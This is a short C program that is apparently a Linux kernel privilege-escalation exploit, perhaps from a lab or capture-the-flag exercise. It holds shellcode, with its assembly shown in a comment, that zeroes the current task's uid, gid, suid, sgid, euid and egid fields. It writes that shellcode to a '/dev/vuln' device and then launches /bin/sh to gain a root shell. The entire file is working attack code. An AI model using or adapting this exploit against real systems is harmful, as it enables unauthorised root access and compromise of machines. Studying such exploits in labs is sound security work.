#include <stdio.h>

/*
    xor    rbx, rbx
    mov    rax, gs:0x20cc0      ;   current_task
    mov    rax, [rax + 0x7d8]   ;   current_cred
    mov    [rax + 0x4], rbx     ;   uid / gid
    mov    [rax + 0xc], rbx     ;   suid / sgid
    mov    [rax + 0x14], rbx    ;   euid / egid
    ret
*/

char shellcode[] = "\x48\x31\xdb\x65\x48\x8b\x04\x25\xc0\x0c\x02\x00\x48\x8b\x80\xd8\x07\x00\x00\x48\x89\x58\x04\x48\x89\x58\x0c\x48\x89\x58\x14\xc3";

int main()
{
        int fd = open("/dev/vuln", 2);
        write(fd, shellcode, sizeof(shellcode));
        system("/bin/sh");
        return 0;
}